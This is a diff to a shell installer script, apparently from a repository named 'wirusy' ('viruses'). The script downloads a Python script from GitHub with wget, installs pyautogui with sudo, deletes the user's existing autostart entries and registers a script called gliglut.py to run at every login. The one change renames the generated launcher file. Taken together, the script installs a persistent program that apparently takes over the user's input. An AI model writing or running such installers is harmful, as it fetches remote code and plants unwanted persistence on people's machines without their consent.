@@ -5,7 +5,7 @@ wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautost
 user=$(whoami)
 sudo pip3 install pyautogui
 rm gliglut.sh
-echo "python3 /home/$user/gliglut.py" > s.sh
+echo "python3 /home/$user/gliglut.py" > gliglut.sh
 chmod +x gliglut.sh
 eval $"rm '/home/$user/.config/autostart/?.desktop'"
 python3 /home/$user/addautostart.py '?' './home/$user/gliglut.sh'
